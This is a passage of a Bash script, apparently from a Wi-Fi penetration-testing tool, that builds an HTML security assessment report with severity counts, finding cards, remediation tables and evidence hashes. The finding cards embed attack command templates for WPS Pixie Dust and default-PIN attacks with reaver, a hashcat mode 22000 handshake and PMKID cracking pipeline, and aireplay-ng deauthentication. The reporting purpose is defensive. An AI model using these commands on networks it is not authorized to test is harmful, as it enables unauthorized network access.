		[[ "$akm" == *802.1X* ]] && enc="ENT"

		n_ap=$((n_ap + 1))
		case "$band" in 2.4) n_24=$((n_24 + 1)) ;; 5) n_5=$((n_5 + 1)) ;; esac

		local ap_sev="INFO" ap_result="-" ap_pindisp="-"
		f=""
		if [[ -n "${cracked[$b]:-}" ]]; then
			ap_result="CRACKED"
			ap_pindisp="key in hand"
			ap_sev="CRITICAL"
		fi
		case "${wstate,,}" in
		configured | 1 | on | yes)
			n_wps=$((n_wps + 1))
			[[ "$ap_result" == "-" ]] && ap_result="wps on"
			;;
		esac

		as_sev+=("$ap_sev")
		as_name+=("$essid")
		as_bss+=("$b")
		as_ch+=("${ch:-?}")
		as_band+=("$band")
		as_sec+=("${enc} / WPS v${ver:-?}")
		as_res+=("$ap_result")
		as_pin+=("$ap_pindisp")
	done


	local -a order=()
	local wantsev i
	for wantsev in CRITICAL HIGH MEDIUM LOW INFO; do
		for i in "${!fnd_sev[@]}"; do
			[[ "${fnd_sev[$i]}" == "$wantsev" ]] && order+=("$i")
		done
	done

	local verdict status_txt status_col
	local n_leads=$((${#wpsk_list[@]} + ${#wps_list[@]}))
	if ((${#_creds_use[@]} > 0)); then
		verdict="The wifi key was recovered for at least one network. Anyone in range can join those networks now."
		status_txt="Compromised"
		status_col="$(_sev_color CRITICAL)"
	elif ((n_leads > 0 || n_pmfmiss > 0 || ${#iso_list[@]} > 0 || ${#nowpa3_list[@]} > 0)); then
		verdict="No key was recovered. Some networks have findings to review (WPS attacked and rejected, and/or posture)."
		status_txt="Review"
		status_col="$(_sev_color MEDIUM)"
	else
		verdict="No confirmed finding in scope and time."
		status_txt="Clean"
		status_col="#15803d"
	fi

	local -a tl=("iw / airodump-ng (scan and recon)")
	((n_wps > 0)) && tl+=("reaver / bully (wps pin)" "pixiewps (offline pixie dust)")
	local used_brute=0 _m
	for _m in "${crit_meth[@]}"; do
		case "$_m" in wpa_brute | pmkid | handshake | pmkid-tm | handshake-tm | defaultkey | defaultkey-tm) used_brute=1 ;; esac
	done
	((used_brute)) && tl+=("hcxdumptool / hcxpcapngtool (capture)" "hashcat -m 22000 (offline crack)")
	((n_pmfmiss > 0)) && tl+=("aireplay-ng / mdk4 (deauth)")
	tl+=("sha256sum (proof file hashing)")
	local tools_txt=""
	for _m in "${tl[@]}"; do tools_txt+="${_m}; "; done
	tools_txt="${tools_txt%; }"

	local kf_crit kf_cause kf_scale kf_first
	if ((n_crit > 0)); then
		kf_crit="${#_creds_use[@]} network(s) had the wifi key recovered (confirmed)."
	else
		kf_crit="No key was recovered (confirmed) in scope and time."
	fi
	if ((n_crit > 0)); then
		kf_cause="A WPS PIN or weak key gave access on the cracked network(s)."
	elif ((n_leads > 0)); then
		kf_cause="WPS is on; the default PIN and/or Pixie Dust were tried and the AP rejected them."
	elif ((n_pmfmiss > 0)); then
		kf_cause="Management frames are not protected (PMF off)."
	else
		kf_cause="Configuration posture only; no confirmed finding."
	fi
	kf_scale="WPS is on in ${n_wps} of ${n_ap} networks (observation)."
	if ((n_crit > 0)); then
		kf_first="Change the key and turn WPS off on the ${#_creds_use[@]} cracked network(s)."
	elif ((n_leads > 0)); then
		kf_first="Turn WPS off on the networks where it is on."
	else
		kf_first="Require PMF (802.11w) and move to WPA3."
	fi

	local total_fnd=$((n_crit + n_high + n_med + n_low))
	((total_fnd == 0)) && total_fnd=1
	local r C
	r=54
	C=$(awk "BEGIN{printf \"%.2f\", 2*3.141592653589793*${r}}")
	local donut="" doff=0 seg segn segcol
	for segn in CRITICAL:$n_crit HIGH:$n_high MEDIUM:$n_med LOW:$n_low; do
		local sk="${segn%%:*}" sv="${segn##*:}"
		((sv == 0)) && continue
		segcol="$(_sev_color "$sk")"
		seg=$(awk "BEGIN{printf \"%.2f\", ${sv}/${total_fnd}*${C}}")
		local rest
		rest=$(awk "BEGIN{printf \"%.2f\", ${C}-${seg}}")
		donut+="$(printf '<circle r="%s" cx="80" cy="80" fill="none" stroke="%s" stroke-width="22" stroke-dasharray="%s %s" stroke-dashoffset="-%s" transform="rotate(-90 80 80)"/>' "$r" "$segcol" "$seg" "$rest" "$doff")"
		doff=$(awk "BEGIN{printf \"%.2f\", ${doff}+${seg}}")
	done

	local html_assets="" a asev rsev rcol restxt
	for a in "${!as_name[@]}"; do
		asev="${as_sev[$a]}"
		case "${as_res[$a]}" in
		CRACKED) rsev="CRITICAL" ;;
		known-pin | wps-open) rsev="HIGH" ;;
		*) rsev="INFO" ;;
		esac
		rcol="$(_sev_color "$rsev")"
		restxt="${as_res[$a]}"
		[[ "${as_res[$a]}" == "known-pin" ]] && restxt="known-pin: ${as_pin[$a]}"
		[[ "${as_res[$a]}" == "CRACKED" ]] && restxt="CRACKED (key in hand)"
		html_assets+="$(printf '<tr><td><span class="pill" style="color:%s;background:%s;border-color:%s33">%s</span></td><td><b>%s</b></td><td class="mono">%s</td><td>ch%s / %s&nbsp;GHz</td><td>%s</td><td><span class="res" style="color:%s">%s</span></td></tr>' \
			"$(_sev_color "$asev")" "$(_sev_bg "$asev")" "$(_sev_color "$asev")" "$(_sev_label "$asev")" \
			"$(_html_escape "${as_name[$a]}")" "$(_html_escape "${as_bss[$a]}")" "${as_ch[$a]}" "${as_band[$a]}" \
			"$(_html_escape "${as_sec[$a]}")" "$rcol" "$(_html_escape "$restxt")")"
	done

	local why_wps="Anyone in radio range can join this wifi, read or change traffic, reach other devices, and open the router if it still uses a default login."
	local imp_wps
	imp_wps="$(_li_esc "unauthorized wifi access" "traffic interception" "access to internal devices" "router takeover if default admin")"

	local html_findings="" f_idx=0 crit_i=0 fid t
	local item ie ib iv iver ichip ich ipmf ienc ik enc2 icv
	for i in "${order[@]}"; do
		f_idx=$((f_idx + 1))
		fid="$(printf 'F-%02d' "$f_idx")"
		t="${fnd_type[$i]}"
		case "$t" in
		crit)
			local k=$crit_i cb ce cm cpin cpsk cpsha cpf cchip cch cband cenc pinS pskS
			cb="${crit_bss[$k]}"
			ce="${crit_ess[$k]:-hidden}"
			cm="${crit_meth[$k]}"
			cpin="${crit_pin[$k]}"
			cpsk="${crit_psk[$k]}"
			cpsha="${crit_psha[$k]:-none}"
			cpf="${crit_proof[$k]:-none}"
			cchip="${crit_chip[$k]:-unknown}"
			cch="${crit_ch[$k]:-?}"
			cband="${crit_band[$k]:-?}"
			cenc="${crit_enc[$k]:-WPA2}"
			pinS="$(_show_pin "$cpin")"
			pskS="$(_mask_psk "$cpsk")"
			local ctitle cdesc cverify
			local -a ctech=()
			case "$cm" in
			pixie)
				ctitle="Wi-Fi key stolen with WPS Pixie Dust (${ce})"
				cdesc="The access point has WPS on. Its chip gives a weak random value, so a tool works out the WPS PIN offline. With the PIN, the full wifi password was recovered."
				cverify="Scan again. WPS must read off and Pixie Dust must fail. The old password must no longer work."
				ctech=("method: pixie dust (offline); tools: reaver -K 1, pixiewps" "command: reaver -i <mon> -b ${cb} -c ${cch} -K 1" "recovered pin: ${pinS}" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: WPS external registrar PIN flaw (US-CERT VU#723755); Pixie Dust weak nonce (D. Bongard 2014)" "proof: ${cpf}")
				;;
			vendor)
				ctitle="Wi-Fi key stolen with a vendor default WPS PIN (${ce})"
				cdesc="The access point has WPS on. The vendor OUI maps to a published default PIN. The PIN was accepted and returned the full wifi password."
				cverify="Scan again. The default PIN must be rejected and the AP must lock after a few bad tries."
				ctech=("method: vendor default pin; tool: reaver -p <pin>" "command: reaver -i <mon> -b ${cb} -c ${cch} -p ${pinS}" "recovered pin: ${pinS}; chip ${cchip}" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: use of default credentials (CWE-1392); WPS PIN flaw (US-CERT VU#723755)" "proof: ${cpf}")
				;;
			null | empty)
				ctitle="WPS accepts a null or empty PIN (${ce})"
				cdesc="The access point accepts a null or empty WPS PIN with no real registrar. The full wifi password was recovered."
				cverify="Scan again. The AP must reject a null or empty WPS PIN."
				ctech=("method: ${cm} pin" "command: reaver -i <mon> -b ${cb} -c ${cch} -p 00000000" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: WPS PIN flaw (US-CERT VU#723755)" "proof: ${cpf}")
				;;
			wpa_brute)
				ctitle="WPA2 key cracked offline from handshake or PMKID (${ce})"
				cdesc="The network uses WPA2 PSK. The 4 way handshake or PMKID was captured and cracked offline with hashcat mode 22000."
				cverify="Set a long random password so an offline dictionary or mask crack fails, then re-test."
				ctech=("method: wpa2 handshake / pmkid (hc22000)" "steps: hcxdumptool capture; hcxpcapngtool -o cap.22000; hashcat -m 22000 cap.22000 <wordlist>" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: offline dictionary crack (hashcat mode 22000)" "proof: ${cpf}")
				;;
			pmkid | handshake)
				local _src="4 way handshake"
				[[ "$cm" == "pmkid" ]] && _src="PMKID (clientless)"
				ctitle="WPA2 key cracked offline from ${_src} (${ce})"
				cdesc="The network uses WPA2 PSK. The ${_src} was captured and then cracked offline with hashcat mode 22000, so the full wifi password is in hand."
				cverify="Set a long random password of 20+ characters so an offline dictionary or mask crack fails, then re-test. The old password must no longer work."
				ctech=("method: wpa2 ${_src} then offline crack (hc22000)" "steps: capture (hcxdumptool / deauth+airodump); hcxpcapngtool -o cap.22000; hashcat -m 22000 cap.22000 <wordlist>" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: offline dictionary crack (hashcat mode 22000); CWE-326 weak psk" "proof: ${cpf}")
				;;
			defaultkey | defaultkey-tm)
				local _tm=""
				[[ "$cm" == "defaultkey-tm" ]] && _tm=" (WPA3 transition AP, WPA2 path)"
				ctitle="WPA2 factory default key recovered from vendor keyspace (${ce})${_tm}"
				cdesc="The access point kept the factory WPA2 password, which this vendor derives from the public MAC and ESSID. A small deterministic candidate set was generated from the BSSID/ESSID and checked against the captured PMKID or handshake, recovering the key in seconds."
				cverify="Set a long random WPA2 password that is not derived from the MAC or ESSID, then re-test. The vendor default-key candidate set must no longer match."
				ctech=("method: vendor default-key keyspace (USENIX WOOT 2015) then offline verify (hc22000)" "steps: generate candidates from bssid/essid (routerkeygen / hcxpsktool); hashcat -m 22000 cap.22000 <candidates>" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: default or derivable credentials (CWE-1392, CWE-330 insufficient key randomness)" "proof: ${cpf}")
				;;
			pmkid-tm | handshake-tm)
				local _src="4 way handshake"
				[[ "$cm" == "pmkid-tm" ]] && _src="PMKID (clientless)"
				ctitle="WPA3 transition AP: WPA2 key cracked offline from ${_src} (${ce})"
				cdesc="The access point runs WPA3 in transition mode, so it still accepts plain WPA2 PSK. The ${_src} was captured over the WPA2 path and cracked offline with hashcat mode 22000, recovering the shared password. WPA3 SAE did not protect this because the WPA2 fallback was left on."
				cverify="Disable WPA3 transition mode (WPA3 SAE only) or set a long random password, then re-test. The WPA2 handshake crack must fail."
				ctech=("method: wpa3 transition downgrade -> wpa2 ${_src} -> offline crack (hc22000)" "steps: capture over wpa2 psk; hcxpcapngtool -o cap.22000; hashcat -m 22000 cap.22000 <wordlist>" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: WPA3 transition-mode downgrade (Dragonblood, Vanhoef & Ronen IEEE S&P 2020); offline dictionary crack (hashcat 22000)" "proof: ${cpf}")
				;;
			*)
				ctitle="Wi-Fi key recovered (${ce})"
				cdesc="Key material was grabbed in this job via ${cm}. See the proof file for the numbers."
				cverify="Redo ${cm} from the attempt log and the proof file; the AP must not give up a key."
				ctech=("method: ${cm}" "recovered pin: ${pinS}; psk: ${pskS}; psk sha256: ${cpsha}" "proof: ${cpf}")
				;;
			esac
			local caff ctechhtml
			caff="$(_li_esc "${ce} (${cb}), ch${cch} / ${cband} GHz, ${cenc}, chip ${cchip}")"
			local _lv
			_lv="$(_proof_live_verified "$cb" 2>/dev/null)" || _lv=""
			[[ -n "$_lv" ]] && ctech+=("live verify: ${_lv}")
			ctechhtml="$(_li_esc "${ctech[@]}")"
			html_findings+="$(_fcard CRITICAL "$fid" "$ctitle" confirmed "Confirmed during the test. The wifi password was recovered and hashed." Immediate "$cdesc" "$caff" "$why_wps" "$imp_wps" "Turn WPS off (PIN and push button). Set a new wifi password of 20+ random characters. Move to WPA3 SAE." "$cverify" "$ctechhtml")"
			crit_i=$((crit_i + 1))
			;;
		knownpin)
			local kaff="" ktech="" p1 cn more
			ktech="$(_li_esc "default pin(s) from the vendor db were tried with reaver; the ap rejected them (see cp_audit.log)")"
			for item in "${wpsk_list[@]}"; do
				IFS='|' read -r ie ib iv iver ichip ich <<<"$item"
				local -a _kp=()
				IFS=' ' read -r -a _kp <<<"$(_known_pins_for "$ib")"
				p1="${_kp[0]:-?}"
				cn="${#_kp[@]}"
				more=""
				((cn > 1)) && more=" (+$((cn - 1)) more)"
				kaff+="<li>$(_html_escape "${ie} (${ib}), ch${ich}, vendor ${iv}, candidate pin ${p1}${more}")</li>"
				ktech+="$(_li_esc "reaver -i <mon> -b ${ib} -c ${ich} -p ${p1}")"
			done
			ktech+="$(_li_esc "class: default credentials (CWE-1392, CWE-308); WPS PIN flaw (US-CERT VU#723755)" "proof: proof_<bssid>_wps_knownpin_*.conf (candidate pin + beacon numbers)")"
			html_findings+="$(_fcard HIGH "$fid" "WPS known default PIN tried, AP rejected it" potential "The published vendor default PIN(s) were tried with reaver and the AP rejected them. WPS is still on. Lead, not a confirmed key." High "WPS is on and the vendor PIN is a public default. The default PIN was tried and did not work, but the registrar stays exposed to other PINs or Pixie Dust." "$kaff" "If a working PIN or Pixie Dust lands, the wifi key falls in seconds." "$(_li_esc "WPS registrar stays exposed to more PIN tries" "fast path to the key if a PIN works")" "Turn WPS off. If it must stay, change the default PIN and lock the AP after a few failed tries." "Turn WPS off and scan again. WPS must read off." "$ktech")"
			;;
		wpsopen)
			local oaff=""
			for item in "${wps_list[@]}"; do
				IFS='|' read -r ie ib iv iver ichip ich <<<"$item"
				oaff+="<li>$(_html_escape "${ie} (${ib}), ch${ich}, vendor ${iv}, chip ${ichip}")</li>"
			done
			html_findings+="$(_fcard HIGH "$fid" "WPS registrar open, Pixie Dust / PIN tried and rejected" potential "WPS was attacked (Pixie Dust and/or default PIN) and did not return a key. The registrar is still on. Lead, not a confirmed key." High "The WPS external registrar is on. Pixie Dust and the default PIN were tried and did not work in this window, but the registrar stays exposed on weak chip families (Ralink, Realtek, Broadcom, MediaTek)." "$oaff" "An open WPS registrar is a direct path to the wifi key once a working PIN or Pixie Dust lands." "$(_li_esc "WPS registrar stays exposed to more PIN tries" "offline PIN recovery possible on weak chips")" "Turn WPS off on every network. Check it stays off after firmware updates." "Turn WPS off and scan again. WPS must read off." "$(_li_esc "tried: reaver -i <mon> -b <bssid> -c <ch> -K 1 (pixie), plus the default PIN; AP rejected" "class: WPS external registrar PIN flaw (US-CERT VU#723755)" "proof: proof_<bssid>_wps_open_*.conf")")"
			;;
		iso)
			local isaff=""
			for item in "${iso_list[@]}"; do
				IFS='|' read -r ie ib ik <<<"$item"
				isaff+="<li>$(_html_escape "${ie} (${ib}), key model ${ik}")</li>"
			done
			html_findings+="$(_fcard "${fnd_sev[$i]}" "$fid" "Client isolation can be bypassed (AirSnitch)" config "Based on standard shared-group-key behavior (posture). Not actively run here; needs two of your own clients on a bench to prove." Planned "All clients on one BSSID share the same group key (GTK). One client can wrap a unicast packet in a GTK broadcast and reach an isolated peer. Routing and switch tricks also cross the isolation line. PMF does not stop this." "$isaff" "If the network relies on client isolation (guest or IoT wifi), one client can reach another, read its traffic, and on WPA2 PSK go to full man-in-the-middle." "$(_li_esc "one client reads or injects another client traffic" "possible full man-in-the-middle on WPA2 PSK" "broken guest or IoT separation")" "Put guest and IoT on their own VLAN and SSID. Block client to client at layer 3 on the gateway. Turn on IP and ARP spoof guards." "On a bench with two of your own clients, confirm one cannot reach the other after the fix." "$(_li_esc "class: Wi-Fi client isolation bypass (AirSnitch, NDSS 2026, Vanhoef et al.)" "taxonomy: MITRE ATT&CK T1557, T1040; CWE-300; CWE-923" "note: posture from scan facts, not an executed exploit" "proof: isolation_<bssid>_*.conf (one per net)")")"
			;;
		pmf)
			local paff=""
			for item in "${pmf_list[@]}"; do
				IFS='|' read -r ie ib ipmf ienc <<<"$item"
				paff+="<li>$(_html_escape "${ie} (${ib}), pmf ${ipmf}, enc ${ienc}")</li>"
			done
			html_findings+="$(_fcard MEDIUM "$fid" "Management frames are not protected (PMF / 802.11w off)" beacon "Based on beacon analysis (the PMF required bit is not set)." "Short term" "Protected Management Frames are not required. So a deauth packet works and pushes a client to redo the handshake. That helps capture the handshake and move clients to a fake access point." "$paff" "Without PMF an attacker can kick clients off, grab the WPA2 handshake for an offline crack, and run denial of service." "$(_li_esc "handshake capture for offline crack" "denial of service by deauth" "easier evil-twin coercion")" "Set PMF to required (WPA3), or at least capable, on every network." "Read the beacon RSN capabilities. The PMF required bit must be set." "$(_li_esc "repro: aireplay-ng --deauth 1 -a <bssid> <mon> then airodump-ng to catch the handshake" "standard: IEEE 802.11w; taxonomy: MITRE ATT&CK T1557" "proof: proof_<bssid>_pmf_off_*.conf")")"
			;;
		nowpa3)
			local naff=""
			for item in "${nowpa3_list[@]}"; do
				IFS='|' read -r ie ib enc2 <<<"$item"
				naff+="<li>$(_html_escape "${ie} (${ib}), enc ${enc2}")</li>"
			done
			html_findings+="$(_fcard LOW "$fid" "No WPA3 SAE" config "Based on configuration analysis (AKM is PSK only)." "Best practice" "The networks use WPA2 PSK only. A captured handshake or PMKID can be run through an offline dictionary crack." "$naff" "WPA2 PSK with a weak password can be cracked offline. WPA3 SAE blocks that path." "$(_li_esc "offline dictionary crack on a captured handshake" "weaker than WPA3 against offline attacks")" "Turn on WPA3 SAE (transition mode if old clients stay). Use a long random password." "Scan again. The network must advertise WPA3 SAE." "$(_li_esc "repro: hashcat -m 22000 <capture.22000> <wordlist>" "class: weak crypto posture (CWE-326)" "proof: proof_<bssid>_nowpa3_*.conf")")"
			;;
		cve)
			local vaff=""
			for item in "${cve_list[@]}"; do
				IFS='|' read -r ie ib icv <<<"$item"
				vaff+="<li>$(_html_escape "${ie} (${ib}), cves ${icv}")</li>"
			done
			html_findings+="$(_fcard INFO "$fid" "Chipset maps to public CVEs (info)" config "Based on a chipset to CVE map. Check the firmware version before calling it exploitable." "Best practice" "The chipset of these networks maps to public CVEs. This is background, not a confirmed exploit." "$vaff" "Some chipset CVEs can be exploitable on old firmware; most are patched on current firmware." "$(_li_esc "depends on firmware version" "informational only")" "Check firmware against the listed CVEs and update where needed." "Confirm the firmware version is newer than the fix for each CVE." "$(_li_esc "note: chip to cve map is info only; verify firmware before action")")"
			;;
		esac
	done
	[[ -n "$html_findings" ]] || html_findings='<div class="panel"><p class="sub">No finding at or above INFO in scope and time.</p></div>'

	local cracked_list=""
	for rec in ${_creds_use[@]+"${_creds_use[@]}"}; do
		cb="${rec%%|*}"
		ce="$(_sar_field "$cb" essid)"
		[[ -n "$ce" ]] || ce="hidden"
		cracked_list+="${ce}, "
	done
	cracked_list="${cracked_list%, }"

	local remed=""
	if ((${#_creds_use[@]} > 0)); then
		remed+="$(printf '<tr class="grp"><td colspan="5">Immediate</td></tr>')"
		remed+="$(printf '<tr><td>%s</td><td>Turn WPS off on the cracked networks and change their wifi password</td><td class="mono sm">%s</td><td>Low</td><td>the recovered keys stop working</td></tr>' "$(_prio_badge Immediate)" "$(_html_escape "$cracked_list")")"
	fi
	local has_short=0
	if ((${#wpsk_list[@]} > 0)); then
		remed+="$(printf '<tr class="grp"><td colspan="5">Short term</td></tr>')"
		has_short=1
		remed+="$(printf '<tr><td>%s</td><td>Change the default WPS PIN or disable the registrar</td><td class="mono sm">%s net(s)</td><td>Low</td><td>known default PIN no longer works</td></tr>' "$(_prio_badge "Short term")" "${#wpsk_list[@]}")"
	fi
	if ((n_pmfmiss > 0)); then
		((has_short)) || { remed+="$(printf '<tr class="grp"><td colspan="5">Short term</td></tr>')"; has_short=1; }
		remed+="$(printf '<tr><td>%s</td><td>Require PMF (802.11w)</td><td class="mono sm">%s net(s)</td><td>Medium</td><td>deauth and handshake grab stop working</td></tr>' "$(_prio_badge "Short term")" "$n_pmfmiss")"
	fi
	local has_med=0
	if ((${#nowpa3_list[@]} > 0)); then
		remed+="$(printf '<tr class="grp"><td colspan="5">Medium term</td></tr>')"
		has_med=1
		remed+="$(printf '<tr><td>%s</td><td>Move to WPA3 SAE (transition mode if needed)</td><td class="mono sm">%s net(s)</td><td>Medium</td><td>offline crack path is closed</td></tr>' "$(_prio_badge Planned)" "${#nowpa3_list[@]}")"
	fi
	if ((${#iso_list[@]} > 0)); then
		((has_med)) || { remed+="$(printf '<tr class="grp"><td colspan="5">Medium term</td></tr>')"; has_med=1; }
		remed+="$(printf '<tr><td>%s</td><td>Put guest/IoT on own VLAN + SSID, block client-to-client at L3</td><td class="mono sm">%s net(s)</td><td>Medium</td><td>client isolation bypass is contained</td></tr>' "$(_prio_badge Planned)" "${#iso_list[@]}")"
	fi
	[[ -n "$remed" ]] || remed="$(printf '<tr><td colspan="5">no action needed</td></tr>')"

	local ev_rows="" ev evt evf evh evz
	for ev in "${_hd}"/proof_*.conf "${_hd}"/isolation_*.conf "${_hd}"/handshake_*.cap \
		"${_hd}"/pmkid_*.22000 "${_hd}"/eapol_*.pcap "${_hd}"/eviltwin/*.log; do
		[[ -f "$ev" ]] || continue
		evt="$(_evtype_for "$ev")"
		evf="${ev#"${_hd}"/}"
		evh="$(_sha256_file "$ev")"
		evz="$(_hsize "$ev")"
		ev_rows+="$(printf '<tr><td>%s</td><td class="mono sm">%s</td><td class="mono hash">%s</td><td class="sm">%s</td></tr>' "$(_html_escape "$evt")" "$(_html_escape "$evf")" "$(_html_escape "${evh:-unavailable}")" "$evz")"
	done
	[[ -n "$ev_rows" ]] || ev_rows="$(printf '<tr><td colspan="4">no proof files</td></tr>')"

	{
		printf '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Security Assessment Report - %s</title>' "$(_html_escape "$TOOL_NAME")"
		cat <<-'CSS'
			<style>
			:root{--bg:#eef1f6;--panel:#fff;--ink:#111827;--muted:#5b6472;--line:#e5e8ef;--safe:#15803d}
			*{box-sizing:border-box}
			html{-webkit-print-color-adjust:exact;print-color-adjust:exact}
			body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}
			.wrap{max-width:1180px;margin:0 auto;padding:24px 20px 60px}
			.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace}
			h2.sec{font-size:13px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin:34px 0 12px;font-weight:700}
			.panel{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:20px 22px;box-shadow:0 1px 2px rgba(16,24,40,.04)}
			.hero{background:linear-gradient(135deg,#0f172a,#1e293b);color:#e8edf6;border-radius:16px;padding:26px 28px;position:relative;overflow:hidden}
			.hero:before{content:"";position:absolute;inset:0 0 auto auto;width:220px;height:220px;background:radial-gradient(circle at 70% 30%,var(--acc),transparent 60%);opacity:.5}
			.hero .kicker{font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:#93a4c0;margin:0 0 6px}
			.hero h1{margin:0;font-size:28px;letter-spacing:-.01em}
			.statusline{margin-top:14px;display:inline-flex;align-items:center;gap:8px;color:#fff;font-weight:700;padding:6px 12px;border-radius:999px;font-size:13px}
			.meta{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin-top:16px}
			.meta div{background:#fff;padding:12px 14px}
			.meta .k{font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted)}
			.meta .v{font-weight:600;margin-top:2px}
			.lead{margin:0;color:#2a3340;max-width:80ch}
			.risk{display:grid;grid-template-columns:1.4fr 1fr;gap:16px;align-items:center}
			.rks{display:grid;grid-template-columns:repeat(5,1fr);gap:10px}
			.rk{border:1px solid var(--line);border-top:3px solid var(--c);border-radius:12px;padding:14px 12px;text-align:center}
			.rk-n{font-size:30px;font-weight:800;line-height:1;color:var(--c)}
			.rk-l{margin-top:6px;font-size:12px;color:var(--muted);display:flex;gap:6px;align-items:center;justify-content:center}
			.dot{width:8px;height:8px;border-radius:50%}
			.donutwrap{display:flex;gap:16px;align-items:center;justify-content:center}
			.donut-n{font-size:30px;font-weight:800;fill:var(--ink)}
			.donut-l{font-size:10px;fill:var(--muted);letter-spacing:.05em}
			.legend{font-size:12px;color:var(--muted)}
			.legend div{display:flex;align-items:center;gap:6px;margin:3px 0}
			.keys{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px}
			.key{border:1px solid var(--line);border-left:4px solid var(--c);border-radius:12px;padding:14px 16px;background:#fff}
			.key .t{font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted)}
			.key .b{font-weight:600;margin-top:4px}
			table{width:100%;border-collapse:collapse;font-size:13.5px}
			th,td{text-align:left;padding:10px 12px;border-bottom:1px solid var(--line);vertical-align:top}
			th{font-size:11px;letter-spacing:.05em;text-transform:uppercase;color:var(--muted);background:#f7f8fb}
			thead{display:table-header-group}
			tr{break-inside:avoid}
			.res{font-weight:600}
			.sm{font-size:12px}
			.hash{word-break:break-all;color:#475467}
			.pill{display:inline-block;font-weight:700;font-size:11px;padding:2px 9px;border-radius:999px;border:1px solid}
			.sub{color:var(--muted)}
			.finding{border:1px solid var(--line);border-left:4px solid var(--c);border-radius:14px;padding:18px 20px;margin:12px 0;background:#fff;break-inside:avoid}
			.f-head{display:flex;flex-wrap:wrap;gap:8px 12px;align-items:center}
			.f-code{font-weight:800;color:var(--muted);font-size:13px;margin-left:4px}
			.f-head h3{margin:0;font-size:17px;flex:1 1 320px}
			.f-meta{display:flex;gap:6px}
			.state,.prio{font-size:11px;font-weight:700;padding:2px 9px;border-radius:999px}
			.prio{background:#fff;border:1px solid}
			.f-desc{margin:12px 0 6px;color:#2a3340}
			.f-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:10px 0}
			.f-lab{font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);margin-bottom:3px;font-weight:700}
			.f-grid p,.f-rec p{margin:0;color:#2a3340}
			ul.tight{margin:0;padding-left:18px}
			ul.tight li{margin:2px 0}
			.f-rec{background:#f7f8fb;border:1px solid var(--line);border-radius:10px;padding:12px 14px;margin-top:8px}
			.f-tech{margin-top:10px;border-top:1px dashed var(--line);padding-top:8px}
			.f-tech summary{cursor:pointer;font-size:12px;font-weight:700;color:var(--muted);letter-spacing:.04em;text-transform:uppercase}
			ul.tech{font-size:12px;color:#475467;margin:8px 0 0;padding-left:16px;word-break:break-word}
			ul.tech li{margin:3px 0}
			.grp td{background:#f2f4f8;font-weight:800;font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:#334155}
			ul.pos{list-style:none;margin:0;padding:0}
			ul.pos li{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px solid var(--line)}
			ul.pos li:last-child{border-bottom:0}
			.chk{color:var(--safe);font-weight:800;background:#ecfdf3;border-radius:50%;width:22px;height:22px;display:inline-flex;align-items:center;justify-content:center;flex:0 0 22px}
			ol.top{margin:0;padding-left:22px}
			ol.top li{margin:7px 0;font-weight:500}
			.foot{margin-top:28px;color:var(--muted);font-size:12px;text-align:center}
			@media (max-width:640px){.risk{grid-template-columns:1fr}.rks{grid-template-columns:repeat(2,1fr)}.f-grid{grid-template-columns:1fr}.hero h1{font-size:22px}}
			@media print{body{background:#fff}.wrap{max-width:none;padding:0}.panel,.finding,.key,.rk{box-shadow:none}.finding{page-break-inside:avoid}h2.sec{page-break-after:avoid}.risk{grid-template-columns:1fr;gap:10px}.rks{grid-template-columns:repeat(5,1fr)}.f-grid{grid-template-columns:1fr 1fr}.donutwrap{justify-content:flex-start}@page{size:A4;margin:12mm}}
			</style>
		CSS
		printf '</head><body><div class="wrap">'

		printf '<div class="hero" style="--acc:%s"><p class="kicker">Security Assessment Report</p><h1>Wi-Fi security assessment</h1><div class="statusline" style="background:%s">&#9679; %s</div></div>' \
			"$status_col" "$status_col" "$(_html_escape "$status_txt")"

		printf '<div class="meta"><div><div class="k">Date</div><div class="v">%s</div></div><div><div class="k">Scope</div><div class="v">%s</div></div><div><div class="k">Mode</div><div class="v">%s</div></div><div><div class="k">Networks tested</div><div class="v">%s</div></div><div><div class="k">Tool</div><div class="v">%s v%s</div></div></div>' \
			"$(_html_escape "$now_dot")" "$(_html_escape "$scope_lbl")" "$(_html_escape "$mode_lbl")" "$n_ap" "$(_html_escape "$TOOL_NAME")" "$(_html_escape "$VERSION")"

		printf '<h2 class="sec">1. Executive summary</h2><div class="panel"><p class="lead">%s We tested %s networks. Findings: %s critical, %s high, %s medium, %s low. First, act on the items in the remediation plan marked immediate.</p></div>' \
			"$(_html_escape "$verdict")" "$n_ap" "$n_crit" "$n_high" "$n_med" "$n_low"

		printf '<h2 class="sec">2. Risk overview</h2><div class="panel risk"><div class="rks">'
		printf '<div class="rk" style="--c:%s"><div class="rk-n">%s</div><div class="rk-l"><span class="dot" style="background:%s"></span>Critical</div></div>' "$(_sev_color CRITICAL)" "$n_crit" "$(_sev_color CRITICAL)"
		printf '<div class="rk" style="--c:%s"><div class="rk-n">%s</div><div class="rk-l"><span class="dot" style="background:%s"></span>High</div></div>' "$(_sev_color HIGH)" "$n_high" "$(_sev_color HIGH)"
